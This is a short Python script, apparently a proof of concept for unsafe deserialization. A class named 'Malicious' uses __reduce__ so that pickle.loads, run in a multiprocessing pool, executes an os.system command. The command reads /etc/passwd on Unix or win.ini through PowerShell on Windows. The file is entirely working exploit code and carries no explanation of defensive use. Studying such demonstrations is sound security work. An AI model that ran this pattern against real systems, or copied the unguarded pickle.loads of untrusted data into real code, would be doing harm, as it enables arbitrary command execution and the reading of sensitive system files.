import multiprocessing
import pickle
import os
import sys

class Malicious:
    def __reduce__(self):
        # Choose command based on operating system
        if sys.platform.startswith('win'):
            cmd = 'powershell -Command "Get-Content C:\\Windows\\win.ini -TotalCount 30"'
        else:
            cmd = 'head -n 30 /etc/passwd'
        return (os.system, (cmd,))

def vulnerable_unpickle(data):
    return pickle.loads(data)

if __name__ == '__main__':
    malicious_pickle = pickle.dumps(Malicious())
    with multiprocessing.Pool(processes=1) as pool:
        try:
            pool.apply(vulnerable_unpickle, (malicious_pickle,))
        except Exception as e:
            print("Error during unpickling:", e)
    print("Vulnerable code executed!")
